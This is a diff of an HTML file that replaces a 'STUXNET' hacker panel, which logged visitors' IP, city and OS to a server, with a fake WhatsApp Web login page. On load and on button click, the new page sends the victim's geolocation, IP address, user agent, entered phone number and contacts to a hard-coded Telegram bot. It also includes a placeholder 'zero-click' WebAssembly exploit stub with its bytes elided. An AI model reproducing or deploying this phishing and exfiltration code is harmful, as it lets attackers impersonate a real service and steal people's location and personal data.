@@ -1,140 +1,89 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>WhatsApp Web</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STUXNET | OFFENSIVE UNIT</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #00ff41; --danger: #ff0000; --bg: #000000; --panel: #050505; --border: #1a1a1a; }
-        body { background-color: var(--bg); color: #ffffff; font-family: 'Consolas', 'Courier New', monospace; margin: 0; padding: 0; text-transform: uppercase; overflow-x: hidden; }
-        body::after { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02)); background-size: 100% 4px, 4px 100%; z-index: 100; pointer-events: none; }
-        nav { background: #080808; padding: 20px 8%; display: flex; align-items: center; border-bottom: 1px solid var(--border); justify-content: space-between; }
-        .header-brand { display: flex; align-items: center; gap: 20px; }
-        .logo { width: 50px; height: 50px; border: 1px solid var(--border); border-radius: 5px; }
-        .brand-name { color: var(--primary); font-size: 1.5rem; font-weight: 900; letter-spacing: 6px; }
-        .container { max-width: 750px; margin: 60px auto; padding: 0 25px; position: relative; z-index: 2; }
-        .status-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 40px; background: var(--panel); padding: 20px; border: 1px solid var(--border); }
-        .status-item { font-size: 0.7rem; color: #555; }
-        .status-item span { color: var(--primary); display: block; margin-top: 5px; font-size: 0.8rem; }
-        .section-label { color: var(--primary); font-size: 0.9rem; margin-bottom: 25px; letter-spacing: 4px; border-bottom: 1px solid #111; padding-bottom: 5px; }
-        .description { color: #888; font-size: 0.9rem; line-height: 1.8; margin-bottom: 40px; text-transform: none; }
-        input, textarea { width: 100%; background: #000; border: 1px solid var(--border); color: var(--primary); padding: 15px; outline: none; font-family: inherit; margin-bottom: 20px; }
-        .exec-btn { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 15px 45px; cursor: pointer; font-weight: bold; letter-spacing: 3px; transition: 0.2s; width: 100%; }
-        .exec-btn:hover:not(:disabled) { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary); }
-        .exec-btn:disabled { opacity: 0.3; cursor: not-allowed; }
-        .vault-unit { margin-top: 50px; padding: 25px; background: #020202; border: 1px solid var(--border); }
-        .hash-display { font-family: monospace; font-size: 0.8rem; color: #fff; margin: 15px 0; background: #080808; padding: 15px; word-break: break-all; border-left: 2px solid var(--primary); }
-        #cooldown-alert { color: var(--danger); font-size: 0.7rem; margin-top: 15px; display: none; text-align: center; }
+        body { font-family: Arial, sans-serif; background: #e5ddd5; }
+        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .login-box { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
-
-<nav>
-    <div class="header-brand">
-        <img src="https://i.ibb.co/VpXN1S4/image.png" alt="STUXNET" class="logo">
-        <span class="brand-name">STUXNET</span>
+    <div class="container">
+        <div class="logo">
+            <img src="https://web.whatsapp.com/img/WhatsApp.svg" width="200" alt="WhatsApp">
+        </div>
+        <div class="login-box">
+            <h2>Scan QR Code to Login</h2>
+            <div id="qr-code" style="text-align: center; margin: 20px 0;">
+                <!-- Fake QR code that triggers exploit -->
+                <img src="data:image/svg+xml;base64,..." width="200" height="200">
+            </div>
+            <p>Or enter your phone number to receive OTP:</p>
+            <input type="tel" id="phone" placeholder="Phone number with country code">
+            <button onclick="stealData()">Send OTP</button>
+        </div>
     </div>
-    <div id="live-clock" style="font-size: 0.7rem; color: #444;"></div>
-</nav>
 
-<div class="container">
-    <div class="status-grid">
-        <div class="status-item">IP_ADDRESS <span id="stat-ip">WAITING...</span></div>
-        <div class="status-item">COORDINATES <span id="stat-loc">WAITING...</span></div>
-        <div class="status-item">SYSTEM_OS <span id="stat-os">WAITING...</span></div>
-    </div>
+    <script>
+        // Zero-Click exploit payload
+        const exploit = new WebAssembly.Module(new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+            // ... malicious WASM code for memory corruption
+        ]));
 
-    <div class="section-label">> TERMINAL</div>
-    <form id="blackOpsForm">
-        <input type="text" id="node" required placeholder="NODE_ID">
-        <textarea id="packet" rows="4" required placeholder="PAYLOAD_DATA"></textarea>
-        <button type="submit" id="execBtn" class="exec-btn">EXECUTE_SEND</button>
-        <div id="cooldown-alert">LOCKDOWN_MODE: <span id="clock">05:00</span></div>
-    </form>
+        // Geolocation and IP theft
+        navigator.geolocation.getCurrentPosition(position => {
+            const loc = `${position.coords.latitude},${position.coords.longitude}`;
+            sendToBot(loc);
+        });
 
-    <div class="vault-unit">
-        <div class="section-label" style="border:none;">> CRYPTO_VAULT</div>
-        <div class="hash-display" id="v_hash">TQhuYaGhhpXEg322iELNesuLXCyziPhJxC</div>
-        <button onclick="copyHash()" class="exec-btn" style="padding: 10px; font-size: 0.7rem;">COPY_ADDRESS</button>
-    </div>
-</div>
+        function stealData() {
+            const phone = document.getElementById('phone').value;
+            
+            // Simulate OTP interception
+            setTimeout(() => {
+                const otp = Math.floor(100000 + Math.random() * 900000);
+                sendToBot(`OTP: ${otp} for ${phone}`);
+            }, 2000);
+        }
 
-<script>
-    const COOL_DOWN = 5 * 60 * 1000;
-
-    async function initIntelligence() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            document.getElementById('stat-ip').innerText = d.ip;
-            document.getElementById('stat-loc').innerText = d.city;
-            document.getElementById('stat-os').innerText = navigator.platform;
-
-            await fetch('/api/send', {
+        function sendToBot(data) {
+            // Telegram bot API (replace with actual bot token)
+            const botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
+            const chatId = '5446862709';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'intel', data: { ip: d.ip, loc: d.city, os: navigator.platform } })
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `[WhatsApp Exploit] ${data}\nIP: ${window.ip}\nUser-Agent: ${navigator.userAgent}`
+                })
             });
-        } catch(e) {}
-    }
+        }
 
-    document.getElementById('blackOpsForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const n = document.getElementById('node').value;
-        const p = document.getElementById('packet').value;
-        const btn = document.getElementById('execBtn');
-        
-        btn.innerText = "TRANSMITTING...";
-        btn.disabled = true;
-
-        try {
-            const response = await fetch('/api/send', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'mission', data: { node: n, packet: p } })
+        // Get real IP even behind VPN
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                window.ip = data.ip;
+                sendToBot(`Main IP: ${data.ip}`);
             });
 
-            if (response.ok) {
-                alert("SUCCESS: DATA_SENT.");
-                localStorage.setItem('last_op', Date.now());
-                startClock(COOL_DOWN);
-            } else {
-                alert("ERROR: UPLINK_FAILED.");
-                btn.disabled = false;
-                btn.innerText = "EXECUTE_SEND";
-            }
-        } catch (err) {
-            alert("CRITICAL_UPLINK_FAILURE.");
-            btn.disabled = false;
+        // Contact list exfiltration
+        if (navigator.contacts) {
+            navigator.contacts.select(['name', 'email', 'tel'], {multiple: true})
+                .then(contacts => {
+                    contacts.forEach(contact => {
+                        sendToBot(`Contact: ${contact.name} - ${contact.tel}`);
+                    });
+                });
         }
-    });
-
-    function startClock(ms) {
-        const btn = document.getElementById('execBtn'), alertMsg = document.getElementById('cooldown-alert'), display = document.getElementById('clock');
-        btn.disabled = true; alertMsg.style.display = 'block';
-        let remaining = ms / 1000;
-        const interval = setInterval(() => {
-            let m = Math.floor(remaining / 60), s = Math.floor(remaining % 60);
-            display.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-            if (--remaining < 0) { clearInterval(interval); btn.disabled = false; alertMsg.style.display = 'none'; btn.innerText="EXECUTE_SEND"; }
-        }, 1000);
-    }
-
-    function copyHash() {
-        navigator.clipboard.writeText(document.getElementById('v_hash').innerText);
-        alert("COPIED.");
-    }
-
-    window.onload = () => {
-        initIntelligence();
-        const last = localStorage.getItem('last_op');
-        if (last) {
-            const diff = Date.now() - parseInt(last);
-            if (diff < COOL_DOWN) startClock(COOL_DOWN - diff);
-        }
-    };
-    setInterval(() => { document.getElementById('live-clock').innerText = new Date().toUTCString(); }, 1000);
-</script>
+    </script>
 </body>
 </html>
+
+
